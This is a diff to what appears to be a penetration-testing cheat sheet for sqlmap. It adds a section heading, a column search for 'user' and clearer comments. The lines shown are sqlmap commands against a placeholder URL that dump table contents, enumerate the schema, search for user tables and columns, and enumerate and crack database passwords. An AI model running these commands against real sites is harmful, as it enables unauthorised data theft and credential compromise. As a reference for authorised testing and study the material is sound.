@@ -63,12 +63,19 @@ sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surna
 
 # Conditional enumeration
 sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"
+```
 
+# Advanced DB Enumeration
+
+```bash
 # Database schema enumeration
 sqlmap -u "http://www.example.com/?id=1" --schema
 
-# Searching for data
+# Searching for table containing the word "user"
 sqlmap -u "http://www.example.com/?id=1" --search -T user
+
+# Searching for column containing the word "user"
+sqlmap -u "http://www.example.com/?id=1" --search -C user
 
 # Password enumeration and cracking
 sqlmap -u "http://www.example.com/?id=1" --passwords --batch
